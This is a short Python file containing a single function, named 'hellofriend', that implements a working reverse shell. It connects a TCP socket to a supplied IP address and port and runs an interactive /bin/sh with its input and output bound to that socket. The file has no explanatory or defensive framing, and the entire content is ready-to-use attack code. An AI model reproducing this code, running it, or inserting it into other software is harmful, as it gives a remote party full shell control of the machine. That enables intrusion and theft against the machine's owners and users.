import socket, subprocess

def hellofriend(con_ip: str, con_port: int):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((con_ip, con_port))
    subprocess.call( ["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno() )

